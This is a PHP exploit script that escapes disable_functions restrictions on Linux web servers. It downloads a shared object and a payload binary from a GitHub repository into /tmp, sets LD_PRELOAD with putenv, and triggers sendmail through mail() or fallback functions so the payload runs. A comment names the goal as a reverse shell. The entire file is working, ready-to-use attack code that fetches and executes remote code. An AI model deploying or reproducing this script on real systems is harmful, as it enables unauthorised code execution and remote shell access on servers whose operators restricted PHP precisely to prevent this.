<?php

if(!function_exists('putenv')) {
    die('Not vulnerable');
}

$arch = php_uname('m');

if ($arch == 'x86_64') {
	$preload = 'preload_x86_64.so';
} else {
	$preload = 'preload_x86.so';
}
/**
 * absolute path only
 */
$ld_preload_path = '/tmp/preload.so';
$payload_path = '/tmp/payload';

$preload_content = file_get_contents(sprintf('https://github.com/Cvar1984/pload/raw/main/%s', $preload));
file_put_contents($ld_preload_path, $preload_content);

$payload_content = file_get_contents('https://github.com/Cvar1984/pload/raw/main/payload');
file_put_contents($payload_path, $payload_content);

putenv(sprintf('PRELOAD=%s', $payload_path));
putenv(sprintf('LD_PRELOAD=%s', $ld_preload_path));

/**
 * PHP in Linux calls a binary "sendmail" when the mail() function is executed. If we have putenv() allowed, we can set the environment variable "LD_PRELOAD", so we can preload an arbitrary shared object. Our shared object will execute our custom payload (a binary or a bash script) without the PHP restrictions, so we can have a reverse shell
 */
if(function_exists('mail')) {
	@mail('a','a','a','a');
} elseif(function_exists('mb_send_mail')) {
	@mb_send_mail('a','a','a','a'); // alternative mail()
} elseif(function_exists('error_log')) {
	@error_log('a',1,'a');
} elseif(function_exists('imap_mail')) {
	@imap_mail('a','a','a');
} elseif(function_exists('error_log')) {
	@error_log('a',1,'a');
}
